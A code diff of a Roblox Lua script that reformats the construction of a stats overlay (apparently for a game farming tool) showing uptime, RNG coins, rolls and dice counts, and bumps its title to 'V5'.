+    local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = Self.GuiName; ScreenGui.IgnoreGuiInset = true; ScreenGui.Parent = Self.Parent; ScreenGui.DisplayOrder = 9999
+    local Background = Instance.new("Frame"); Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Background.BorderColor3 = Color3.fromRGB(150, 0, 255); Background.BorderMode = Enum.BorderMode.Inset; Background.Size = UDim2.new(1, 0, 1, 0); Background.Parent = ScreenGui
+    local Container = Instance.new("Frame"); Container.Size = UDim2.new(1, 0, 1, 0); Container.BackgroundTransparency = 1; Container.Parent = Background
     Self.Container = Container
-
-    local Layout = Instance.new("UIListLayout")
-    Layout.Padding = UDim.new(0.015, 0)
-    Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    Layout.VerticalAlignment = Enum.VerticalAlignment.Center
-    Layout.SortOrder = Enum.SortOrder.LayoutOrder
-    Layout.Parent = Container
-
-    local ToggleBtn = Instance.new("TextButton")
-    ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
-    ToggleBtn.Position = UDim2.new(1, -20, 1, -20)
-    ToggleBtn.AnchorPoint = Vector2.new(1, 1)
-    ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    ToggleBtn.Text = "👁"
-    ToggleBtn.TextSize = 22
-    ToggleBtn.Parent = ScreenGui
     
-    local UICornerBtn = Instance.new("UICorner")
-    UICornerBtn.CornerRadius = UDim.new(1, 0)
-    UICornerBtn.Parent = ToggleBtn
+    local Layout = Instance.new("UIListLayout"); Layout.Padding = UDim.new(0.015, 0); Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; Layout.VerticalAlignment = Enum.VerticalAlignment.Center; Layout.SortOrder = Enum.SortOrder.LayoutOrder; Layout.Parent = Container
     
-    local UIStrokeBtn = Instance.new("UIStroke")
-    UIStrokeBtn.Color = Color3.fromRGB(150, 0, 255)
-    UIStrokeBtn.Thickness = 2
-    UIStrokeBtn.Parent = ToggleBtn
+    local ToggleBtn = Instance.new("TextButton"); ToggleBtn.Size = UDim2.new(0, 45, 0, 45); ToggleBtn.Position = UDim2.new(1, -20, 1, -20); ToggleBtn.AnchorPoint = Vector2.new(1, 1); ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15); ToggleBtn.Text = "👁"; ToggleBtn.TextSize = 22; ToggleBtn.Parent = ScreenGui
+    local UICornerBtn = Instance.new("UICorner"); UICornerBtn.CornerRadius = UDim.new(1, 0); UICornerBtn.Parent = ToggleBtn
+    local UIStrokeBtn = Instance.new("UIStroke"); UIStrokeBtn.Color = Color3.fromRGB(150, 0, 255); UIStrokeBtn.Thickness = 2; UIStrokeBtn.Parent = ToggleBtn
     
-    ToggleBtn.MouseButton1Click:Connect(function()
-        Background.Visible = not Background.Visible
-        ToggleBtn.Text = Background.Visible and "👁" or "🙈"
-    end)
+    ToggleBtn.MouseButton1Click:Connect(function() Background.Visible = not Background.Visible; ToggleBtn.Text = Background.Visible and "👁" or "🙈" end)
 
     local Sorted = {}
     for Name, Data in pairs(Config.UI) do table.insert(Sorted, {Name = Name, Order = Data[1], Text = Data[2], Size = Data[3]}) end
     table.sort(Sorted, function(A, B) return A.Order < B.Order end)
 
     for Index, Item in ipairs(Sorted) do
-        local Label = Instance.new("TextLabel")
-        Label.Name = Item.Name
-        Label.LayoutOrder = Item.Order
-        Label.Size = Item.Size and UDim2.new(unpack(Item.Size)) or UDim2.new(0.6, 0, 0.045, 0)
-        Label.BackgroundTransparency = 1
-        Label.Font = Enum.Font.FredokaOne
-        Label.Text = Item.Text
-        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
-        Label.TextScaled = true
-        Label.Parent = Self.Container
+        local Label = Instance.new("TextLabel"); Label.Name = Item.Name; Label.LayoutOrder = Item.Order; Label.Size = Item.Size and UDim2.new(unpack(Item.Size)) or UDim2.new(0.6, 0, 0.045, 0); Label.BackgroundTransparency = 1; Label.Font = Enum.Font.FredokaOne; Label.Text = Item.Text; Label.TextColor3 = Color3.fromRGB(255, 255, 255); Label.TextScaled = true; Label.Parent = Self.Container
         Self.Elements[Item.Name] = Label
-
         if Index < #Sorted then
-            local Spacer = Instance.new("Frame")
-            Spacer.LayoutOrder = Item.Order + 0.5
-            Spacer.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
-            Spacer.Size = UDim2.new(0.4, 0, 0, 2)
-            Spacer.Parent = Self.Container
+            local Spacer = Instance.new("Frame"); Spacer.LayoutOrder = Item.Order + 0.5; Spacer.BackgroundColor3 = Color3.fromRGB(150, 0, 255); Spacer.Size = UDim2.new(0.4, 0, 0, 2); Spacer.Parent = Self.Container
         end
     end
     return Self
 end
 
-function FarmUI:SetText(Name, Text) 
-    if self.Elements[Name] then task.defer(function() self.Elements[Name].Text = Text end) end 
-end
+function FarmUI:SetText(Name, Text) if self.Elements[Name] then task.defer(function() self.Elements[Name].Text = Text end) end end 
 
 local UI = FarmUI.new({
     UI = {
-        ["Title"]    = {1, "🎲 RNG EVENT CORE", {0.8, 0, 0.08, 0}},
+        ["Title"]    = {1, "🎲 RNG EVENT CORE V5", {0.8, 0, 0.08, 0}},
         ["Uptime"]   = {2, "Time: 00:00:00 | FPS: 0"},
         ["RNGCoins"] = {3, "RNG Coins: 0"},
         ["Rolls"]    = {4, "Total Rolls: 0"},
@@ -746,7 +530,6 @@ local startTime = tonumber(os.time()) or 0
 task.spawn(function()
     while task.wait(1) do
         local diff = (tonumber(os.time()) or 0) - startTime
-        
         local currentCoin = GetItemAmount(config.CoinID)
         local save = Save.Get()
         local currentRolls = 0; pcall(function() currentRolls = save.TotalRollsV2 or save.RngRolls2 or save.RngRolls or 0 end)
@@ -756,7 +539,6 @@ task.spawn(function()
         UI:SetText("Rolls", "Total Rolls: " .. FormatValue(currentRolls))
         UI:SetText("Dice1", string.format("Lucky: %s | Lucky II: %s", FormatValue(GetDiceCount("Lucky Dice V2")), FormatValue(GetDiceCount("Lucky Dice II V2"))))
         UI:SetText("Dice2", string.format("Mega: %s | Mega II: %s", FormatValue(GetDiceCount("Mega Lucky Dice V2")), FormatValue(GetDiceCount("Mega Lucky Dice II V2"))))
-        
         frames = 0
     end
 end)
